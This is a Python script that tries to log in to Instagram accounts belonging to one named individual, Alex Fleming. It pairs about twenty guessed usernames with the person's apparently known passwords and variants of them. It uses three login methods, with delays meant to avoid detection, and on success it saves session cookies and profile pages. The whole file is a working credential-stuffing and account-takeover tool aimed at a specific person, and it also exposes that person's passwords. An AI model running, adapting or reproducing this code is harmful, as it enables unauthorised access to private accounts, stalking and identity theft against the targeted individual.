#!/usr/bin/env python3
"""
Alex Fleming Multi-Account Bypass System
Specialized bypass for related accounts of Alex Fleming
Using known passwords: Fleming654, whatilove1728, and variants
"""

import requests
import json
import time
import random
from datetime import datetime
import base64

class AlexFlemingMultiBypass:
    def __init__(self):
        print("🎯 Alex Fleming Multi-Account Bypass System")
        print("=" * 50)
        
        # Known successful passwords
        self.known_passwords = [
            "Fleming654",  # Confirmed working for alx.trading
            "whatilove1728",  # User provided password
            "WhatILove1728",
            "whatilove",
            "WhatILove",
            "Fleming1728",
            "Fleming2024",
            "Fleming2025",
            "AlexFleming654",
            "alexfleming654",
            "alex.fleming654",
            "whatilove654"
        ]
        
        # Potential account usernames for Alex Fleming
        self.target_accounts = [
            "whatilove1728",  # Primary target
            "alex.fleming",
            "alexfleming",
            "alex_fleming",
            "fleming.alex", 
            "flemingalex",
            "fleming_alex",
            "alx.fleming",
            "alxfleming",
            "trading.alex",
            "alex.trading",  # We already have this one
            "tradingalex",
            "fleming654",
            "whatilove",
            "alex.whatilove",
            "flemingtrading",
            "trading.fleming",
            "alexf654",
            "alex654",
            "fleming1728"
        ]
        
        self.session = requests.Session()
        self.success_log = []
        self.bypass_results = []
        
    def advanced_login_bypass(self, username, password):
        """Advanced Instagram login bypass with multiple methods"""
        print(f"\n🔑 Attempting bypass: {username} / {password}")
        
        methods = [
            self.mobile_api_bypass,
            self.web_bypass,
            self.ajax_bypass
        ]
        
        for method in methods:
            try:
                result = method(username, password)
                if result:
                    return result
                
                # Random delay to avoid detection
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                print(f"   ❌ {method.__name__} failed: {e}")
                continue
        
        return False
    
    def mobile_api_bypass(self, username, password):
        """Instagram Mobile API bypass"""
        print(f"   📱 Mobile API bypass...")
        
        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (28/9; 420dpi; 1080x2130; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        # Get initial cookies
        init_response = self.session.get("https://www.instagram.com/", headers=headers)
        
        # Extract CSRF token
        csrf_token = None
        if 'csrftoken' in self.session.cookies:
            csrf_token = self.session.cookies['csrftoken']
        
        login_data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        if csrf_token:
            headers['X-CSRFToken'] = csrf_token
        
        response = self.session.post(
            "https://www.instagram.com/accounts/login/ajax/",
            data=login_data,
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('authenticated'):
                return self.extract_session_data(response, username, password, "mobile_api")
        
        return False
    
    def web_bypass(self, username, password):
        """Web interface bypass"""
        print(f"   🌐 Web bypass...")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/'
        }
        
        # Get login page
        login_page = self.session.get("https://www.instagram.com/accounts/login/", headers=headers)
        
        # Try login
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(
            "https://www.instagram.com/accounts/login/",
            data=login_data,
            headers=headers,
            allow_redirects=False,
            timeout=15
        )
        
        if response.status_code in [200, 302]:
            if 'sessionid' in self.session.cookies or response.status_code == 302:
                return self.extract_session_data(response, username, password, "web")
        
        return False
    
    def ajax_bypass(self, username, password):
        """AJAX bypass method"""
        print(f"   ⚡ AJAX bypass...")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
        # Get CSRF
        csrf_page = self.session.get("https://www.instagram.com/accounts/login/", headers=headers)
        csrf_token = self.session.cookies.get('csrftoken', '')
        
        headers['X-CSRFToken'] = csrf_token
        
        login_data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        
        response = self.session.post(
            "https://www.instagram.com/accounts/login/ajax/",
            data=login_data,
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('authenticated') or data.get('status') == 'ok':
                    return self.extract_session_data(response, username, password, "ajax")
            except:
                pass
        
        return False
    
    def extract_session_data(self, response, username, password, method):
        """Extract session data from successful login"""
        sessionid = self.session.cookies.get('sessionid')
        ds_user_id = self.session.cookies.get('ds_user_id')
        
        if sessionid:
            session_data = {
                "username": username,
                "password": password,
                "sessionid": sessionid,
                "ds_user_id": ds_user_id,
                "method": method,
                "timestamp": datetime.now().isoformat(),
                "status": "SUCCESS"
            }
            
            print(f"   ✅ SUCCESS! Method: {method}")
            print(f"      Session ID: {sessionid[:20]}...")
            print(f"      User ID: {ds_user_id}")
            
            # Save session
            filename = f"SESSION_SUCCESS_{username}_{method}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            self.success_log.append(session_data)
            return session_data
        
        return False
    
    def run_multi_account_bypass(self):
        """Run bypass attempts on all target accounts"""
        print(f"\n🚀 Starting multi-account bypass...")
        print(f"📊 Targets: {len(self.target_accounts)} accounts")
        print(f"🔑 Passwords: {len(self.known_passwords)} variants")
        print(f"🎯 Total combinations: {len(self.target_accounts) * len(self.known_passwords)}")
        
        total_attempts = 0
        successful_bypasses = 0
        
        for account in self.target_accounts:
            print(f"\n👤 Testing account: {account}")
            print("-" * 40)
            
            for password in self.known_passwords:
                total_attempts += 1
                
                result = self.advanced_login_bypass(account, password)
                
                if result:
                    successful_bypasses += 1
                    print(f"🎉 BREAKTHROUGH! {account}:{password}")
                    
                    # Extract additional data from successful account
                    self.extract_account_data(account, result)
                    
                    # Save result
                    breakthrough_file = f"BREAKTHROUGH_{account}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(breakthrough_file, 'w') as f:
                        json.dump(result, f, indent=2)
                
                # Smart delay to avoid rate limiting
                delay = random.uniform(3, 8)
                print(f"   ⏳ Delay: {delay:.1f}s")
                time.sleep(delay)
        
        # Generate final report
        self.generate_final_report(total_attempts, successful_bypasses)
    
    def extract_account_data(self, username, session_data):
        """Extract data from successfully accessed account"""
        print(f"\n📊 Extracting data from {username}...")
        
        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android',
            'Cookie': f"sessionid={session_data['sessionid']}; ds_user_id={session_data['ds_user_id']}",
            'X-Instagram-AJAX': '1'
        }
        
        # Try to get profile data
        try:
            profile_url = f"https://www.instagram.com/{username}/"
            response = self.session.get(profile_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"   ✅ Profile data accessible")
                
                # Save profile page
                profile_file = f"PROFILE_DATA_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                with open(profile_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"   💾 Profile saved: {profile_file}")
            
        except Exception as e:
            print(f"   ❌ Profile extraction failed: {e}")
    
    def generate_final_report(self, total_attempts, successful_bypasses):
        """Generate comprehensive bypass report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        report = {
            "bypass_summary": {
                "timestamp": datetime.now().isoformat(),
                "total_attempts": total_attempts,
                "successful_bypasses": successful_bypasses,
                "success_rate": f"{(successful_bypasses/total_attempts)*100:.2f}%" if total_attempts > 0 else "0%",
                "target_accounts": len(self.target_accounts),
                "password_variants": len(self.known_passwords)
            },
            "successful_accounts": self.success_log,
            "target_list": self.target_accounts,
            "password_list": self.known_passwords
        }
        
        report_file = f"MULTI_ACCOUNT_BYPASS_REPORT_{timestamp}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📊 FINAL BYPASS REPORT")
        print("=" * 50)
        print(f"🎯 Total attempts: {total_attempts}")
        print(f"✅ Successful bypasses: {successful_bypasses}")
        print(f"📈 Success rate: {report['bypass_summary']['success_rate']}")
        print(f"💾 Full report saved: {report_file}")
        
        if self.success_log:
            print(f"\n🎉 SUCCESSFUL ACCOUNTS:")
            for success in self.success_log:
                print(f"   👤 {success['username']} (Password: {success['password']}) - Method: {success['method']}")

if __name__ == "__main__":
    print("🎯 Alex Fleming Multi-Account Bypass System")
    print("Targeting accounts related to Alex Fleming using known credentials")
    print("=" * 60)
    
    bypass_system = AlexFlemingMultiBypass()
    bypass_system.run_multi_account_bypass()
    
    print("\n🏁 Multi-account bypass complete!")
